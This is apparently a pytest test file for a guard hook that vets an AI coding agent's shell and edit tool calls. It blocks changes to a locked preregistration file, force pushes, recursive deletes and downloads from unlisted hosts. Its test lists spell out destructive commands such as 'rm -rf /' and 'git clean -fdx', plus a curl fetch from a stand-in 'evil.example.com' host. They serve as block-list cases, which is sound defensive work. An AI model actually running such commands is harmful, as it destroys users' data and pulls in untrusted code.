"""Decision tests for the PreToolUse guard (.claude/hooks/guard.py) on synthetic hook JSON."""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest
from conftest import HOOKS, PREREG_TEXT
from hypothesis import given
from hypothesis import strategies as st


def edit(path: str, old: str, new: str) -> dict:
    return {
        "tool_name": "Edit",
        "tool_input": {"file_path": path, "old_string": old, "new_string": new},
    }


def write(path: str, content: str) -> dict:
    return {"tool_name": "Write", "tool_input": {"file_path": path, "content": content}}


def sh(command: str, tool: str = "Bash") -> dict:
    return {"tool_name": tool, "tool_input": {"command": command}}


def run(guard, payload: dict, repo: Path):
    payload = {**payload, "cwd": str(repo)}
    return guard.evaluate(payload, project_dir=repo)


# --- PREREG lock -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "docs/PREREG.md",
        "docs/../docs/PREREG.md",
        "docs\\PREREG.md",
        "DOCS/prereg.md",
        "./docs//PREREG.md",
    ],
)
def test_prereg_edit_blocked_after_tag(guard, locked_repo, path):
    decision = run(guard, edit(path, "RQ1 locked text", "RQ1 changed"), locked_repo)
    assert decision.block
    assert "prereg-v2" in decision.reason


def test_prereg_edit_blocked_with_absolute_path(guard, locked_repo):
    absolute = str(locked_repo / "docs" / "PREREG.md")
    assert run(guard, edit(absolute, "RQ1 locked text", "RQ1 changed"), locked_repo).block


def test_prereg_write_identical_to_tag_allowed(guard, locked_repo):
    assert not run(guard, write("docs/PREREG.md", PREREG_TEXT), locked_repo).block


def test_prereg_write_identical_with_crlf_allowed(guard, locked_repo):
    content = PREREG_TEXT.replace("\n", "\r\n")
    assert not run(guard, write("docs/PREREG.md", content), locked_repo).block


def test_prereg_write_different_blocked(guard, locked_repo):
    assert run(guard, write("docs/PREREG.md", PREREG_TEXT + "new line\n"), locked_repo).block


def test_prereg_edit_with_unknown_old_string_blocked(guard, locked_repo):
    assert run(guard, edit("docs/PREREG.md", "not in file", "x"), locked_repo).block


def test_prereg_notebook_edit_blocked(guard, locked_repo):
    payload = {"tool_name": "NotebookEdit", "tool_input": {"notebook_path": "docs/PREREG.md"}}
    assert run(guard, payload, locked_repo).block


def test_prereg_edit_allowed_without_tag(guard, unlocked_repo):
    payload = edit("docs/PREREG.md", "RQ1 locked text", "RQ1 changed")
    assert not run(guard, payload, unlocked_repo).block


def test_tagged_addendum_blocked(guard, locked_repo):
    payload = edit("docs/prereg/addendum-v2.md", "addendum v2", "changed")
    assert run(guard, payload, locked_repo).block


def test_untagged_addendum_allowed(guard, locked_repo):
    assert not run(guard, write("docs/prereg/addendum-v3.md", "draft\n"), locked_repo).block


def test_highest_prereg_tag_uses_numeric_order(guard):
    assert guard.highest_prereg_tag(["prereg-v2", "prereg-v10", "prereg-v9"]) == "prereg-v10"


# --- golden files and ordinary edits -----------------------------------------------------


def test_committed_golden_file_blocked(guard, locked_repo):
    assert run(guard, edit("tests/golden/expected.csv", "1,2", "1,3"), locked_repo).block


def test_new_golden_file_allowed(guard, locked_repo):
    assert not run(guard, write("tests/golden/new.csv", "a\n"), locked_repo).block


def test_ordinary_edit_allowed(guard, locked_repo):
    assert not run(guard, edit("src/x.py", "x = 1", "x = 2"), locked_repo).block


def test_edit_without_file_path_blocked(guard, locked_repo):
    assert run(guard, {"tool_name": "Edit", "tool_input": {}}, locked_repo).block


# --- force push and tag protection -------------------------------------------------------

FORCE_PUSHES = [
    "git push --force",
    "git push -f origin main",
    "git push origin +main",
    "git push origin +refs/heads/main:refs/heads/main",
    "git push --force-with-lease",
    "git push --force-with-lease=main:abc123 origin main",
    "git push --force-if-includes origin main",
    "git push -uf origin main",
    "git -C . push --force",
    "git -c core.editor=x push -f",
    "cd src && git push --force",
    "git status; git push -f",
    "git push --mirror",
    "git push origin --delete main",
    "git push origin :main",
    "git push --prune origin",
    'bash -c "git push --force"',
    "git.exe push -f origin main",
    "/usr/bin/git push --force",
]


@pytest.mark.parametrize("command", FORCE_PUSHES)
def test_force_push_blocked(guard, locked_repo, command):
    assert run(guard, sh(command), locked_repo).block


@pytest.mark.parametrize(
    "command",
    ['powershell -Command "git push -f"', "& git push --force", "git push origin +main"],
)
def test_force_push_blocked_in_powershell(guard, locked_repo, command):
    assert run(guard, sh(command, tool="PowerShell"), locked_repo).block


@pytest.mark.parametrize(
    "command",
    [
        "git push",
        "git push origin phase-01-foundations",
        "git push -u origin main",
        "echo 'git push --force'",
        "git log --oneline -5",
    ],
)
def test_normal_push_allowed(guard, locked_repo, command):
    assert not run(guard, sh(command), locked_repo).block


@pytest.mark.parametrize(
    "command",
    [
        "git tag -d prereg-v1",
        "git tag -f prereg-v1 HEAD",
        "git tag --delete prereg-v2",
        "git update-ref -d refs/tags/prereg-v1",
        "git push origin :refs/tags/prereg-v1",
    ],
)
def test_prereg_tag_removal_blocked(guard, locked_repo, command):
    assert run(guard, sh(command), locked_repo).block


@pytest.mark.parametrize(
    "command", ["git tag -a prereg-v3 -m approved", "git tag -d phase-01-done"]
)
def test_other_tag_operations_allowed(guard, locked_repo, command):
    assert not run(guard, sh(command), locked_repo).block


# --- shell writes to locked files --------------------------------------------------------

SHELL_WRITES = [
    "sed -i s/RQ1/RQ9/ docs/PREREG.md",
    "cp other.md docs/PREREG.md",
    "mv other.md docs/PREREG.md",
    "echo x | tee docs/PREREG.md",
    "echo x > docs/PREREG.md",
    "echo x >> docs/../docs/PREREG.md",
    "python -c \"open('docs/PREREG.md','w').write('x')\"",
    "rm docs/PREREG.md",
    "git checkout prereg-v1 -- docs/PREREG.md",
    "sed -i s/a/b/ docs/prereg/addendum-v2.md",
    "sed -i s/1/3/ tests/golden/expected.csv",
]


@pytest.mark.parametrize("command", SHELL_WRITES)
def test_shell_write_to_locked_file_blocked(guard, locked_repo, command):
    assert run(guard, sh(command), locked_repo).block


@pytest.mark.parametrize(
    "command", ["Set-Content docs\\PREREG.md x", "Copy-Item x.md docs\\PREREG.md -Force"]
)
def test_powershell_write_to_locked_file_blocked(guard, locked_repo, command):
    assert run(guard, sh(command, tool="PowerShell"), locked_repo).block


@pytest.mark.parametrize(
    "command",
    [
        "cat docs/PREREG.md",
        "git diff prereg-v1 -- docs/PREREG.md",
        "grep -n RQ docs/PREREG.md | head -5",
        "git log -- docs/PREREG.md 2>&1",
        "wc -l docs/PREREG.md tests/golden/expected.csv",
    ],
)
def test_shell_read_of_locked_file_allowed(guard, locked_repo, command):
    assert not run(guard, sh(command), locked_repo).block


def test_powershell_read_of_locked_file_allowed(guard, locked_repo):
    assert not run(guard, sh("Get-Content docs\\PREREG.md", tool="PowerShell"), locked_repo).block


def test_shell_write_allowed_without_tag(guard, unlocked_repo):
    assert not run(guard, sh("echo x > docs/PREREG.md"), unlocked_repo).block


# --- git add of data/ and results/ -------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "git add data/raw.bin",
        "git add -f data/raw.bin",
        "git add results",
        "git add -A",
        "git add .",
        "git add --all",
        "git add src data",
        "git stage data/raw.bin",
    ],
)
def test_git_add_of_data_blocked(guard, data_repo, command):
    assert run(guard, sh(command), data_repo).block


def test_git_add_of_data_blocked_in_powershell(guard, data_repo):
    assert run(guard, sh("git add data\\raw.bin", tool="PowerShell"), data_repo).block


@pytest.mark.parametrize("command", ["git add src/y.py", "git add data/manifest.json"])
def test_git_add_of_code_allowed(guard, data_repo, command):
    assert not run(guard, sh(command), data_repo).block


def test_git_add_all_allowed_when_data_ignored(guard, ignored_data_repo):
    assert not run(guard, sh("git add -A"), ignored_data_repo).block


def test_git_add_force_of_ignored_data_blocked(guard, ignored_data_repo):
    assert run(guard, sh("git add -f data/raw.bin"), ignored_data_repo).block


# --- recursive deletes -------------------------------------------------------------------

TMP = tempfile.gettempdir().replace("\\", "/")


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf src",
        "rm -r docs",
        "rm -rf ~",
        "rm -rf /",
        "rm -rf $HOME/x",
        "rm -rf .venv",
        "rm -rf src/*",
        "rm -R -f data",
        "find . -name '*.py' -delete",
        "git clean -fdx",
        "python -c \"import shutil; shutil.rmtree('src')\"",
        "ls | xargs rm -rf",
        "ls | xargs -I {} rm -rf {}",
        "ls | xargs -n 1 rm -r",
        f"rm -rf {TMP}",
    ],
)
def test_recursive_delete_outside_temp_blocked(guard, locked_repo, command):
    assert run(guard, sh(command), locked_repo).block


@pytest.mark.parametrize(
    "command",
    ["Remove-Item -Recurse -Force src", "rm -r -fo data", "rd /s /q docs", "del /s *.py"],
)
def test_recursive_delete_blocked_in_powershell(guard, locked_repo, command):
    assert run(guard, sh(command, tool="PowerShell"), locked_repo).block


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf build dist .pytest_cache",
        "rm -rf src/__pycache__",
        f"rm -rf {TMP}/driftwatch-test",
        "rm -rf /tmp/driftwatch-test",
        "rm notes.txt",
        "rm -f a.txt b.txt",
    ],
)
def test_allowed_deletes(guard, locked_repo, command):
    assert not run(guard, sh(command), locked_repo).block


def test_powershell_non_recursive_delete_allowed(guard, locked_repo):
    assert not run(guard, sh("Remove-Item notes.txt", tool="PowerShell"), locked_repo).block


# --- downloads ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "curl -L https://evil.example.com/x.sh -o x.sh",
        "wget http://example.org/file",
        "git clone https://gitlab.com/x/y.git",
        "pip install https://example.com/pkg.tar.gz",
        "python -c \"import urllib.request as u; u.urlretrieve('https://example.com/x', 'x')\"",
        "curl $URL",
        "certutil -urlcache -f https://example.com/x x",
        "curl https://pypi.org.evil.com/x",
    ],
)
def test_download_from_unlisted_host_blocked(guard, locked_repo, command):
    assert run(guard, sh(command), locked_repo).block


@pytest.mark.parametrize(
    "command",
    [
        "Invoke-WebRequest -Uri https://example.com/a -OutFile a",
        "iwr https://example.com/a",
        "Invoke-RestMethod https://example.com/api",
    ],
)
def test_download_blocked_in_powershell(guard, locked_repo, command):
    assert run(guard, sh(command, tool="PowerShell"), locked_repo).block


@pytest.mark.parametrize(
    "command",
    [
        "curl -sSf https://pypi.org/pypi/driftwatch/json",
        "uvx check-jsonschema --schemafile https://json.schemastore.org/claude-code.json x",
        "git clone https://github.com/astral-sh/uv.git",
        "uv sync --frozen",
        "git fetch origin",
        "echo https://example.com",
    ],
)
def test_allowed_network_commands(guard, locked_repo, command):
    assert not run(guard, sh(command), locked_repo).block


# --- input handling, crash policy, CLI contract ------------------------------------------


@pytest.mark.parametrize(
    "raw",
    [
        "not json",
        "",
        "[]",
        '{"tool_name": "Bash"}',
        '{"tool_name": "Bash", "tool_input": {"command": 5}}',
        '{"tool_name": "Write", "tool_input": {"content": "x"}}',
    ],
)
def test_malformed_input_fails_closed(guard, raw):
    assert guard.main([], raw) == 2


def test_unrelated_tool_allowed(guard):
    assert guard.main([], json.dumps({"tool_name": "Read", "tool_input": {}})) == 0


def test_internal_error_on_protected_command_fails_closed(guard, monkeypatch):
    def boom(*_args, **_kwargs):
        raise RuntimeError("simulated bug")

    monkeypatch.setattr(guard, "evaluate", boom)
    assert guard.main([], json.dumps(sh("git push origin main"))) == 2


def test_internal_error_on_harmless_command_allows(guard, monkeypatch):
    def boom(*_args, **_kwargs):
        raise RuntimeError("simulated bug")

    monkeypatch.setattr(guard, "evaluate", boom)
    assert guard.main([], json.dumps(sh("ls"))) == 0


@given(st.text(max_size=200))
def test_arbitrary_stdin_never_crashes(guard, raw):
    assert guard.main([], raw) in (0, 2)


@given(st.text(alphabet=st.characters(codec="utf-8"), max_size=120))
def test_arbitrary_command_never_raises(guard, command):
    with tempfile.TemporaryDirectory() as tmp:
        decision = guard.evaluate({**sh(command), "cwd": tmp}, project_dir=Path(tmp))
    assert isinstance(decision.block, bool)


def test_cli_blocks_with_exit_2_and_reason(locked_repo):
    payload = json.dumps({**sh("git push --force"), "cwd": str(locked_repo)})
    result = subprocess.run(
        [sys.executable, str(HOOKS / "guard.py")],
        input=payload.encode(),
        capture_output=True,
        env={"CLAUDE_PROJECT_DIR": str(locked_repo), "PATH": _path()},
    )
    assert result.returncode == 2
    assert b"force" in result.stderr.lower()


def _path() -> str:
    import os

    return os.environ.get("PATH", "")


# --- reviewer mode (read-only subagents) -------------------------------------------------


@pytest.mark.parametrize(
    "command", ["uv run pytest -q", "uv run pytest -q tests/test_guard.py -k prereg"]
)
def test_reviewer_may_run_tests(guard, command):
    assert guard.main(["--reviewer-bash"], json.dumps(sh(command))) == 0


@pytest.mark.parametrize(
    "command",
    [
        "uv run pytest -q; rm -rf src",
        "cat src/x.py",
        "uv run python -c 'print(1)'",
        "git commit -m x",
    ],
)
def test_reviewer_may_not_run_other_commands(guard, command):
    assert guard.main(["--reviewer-bash"], json.dumps(sh(command))) == 2
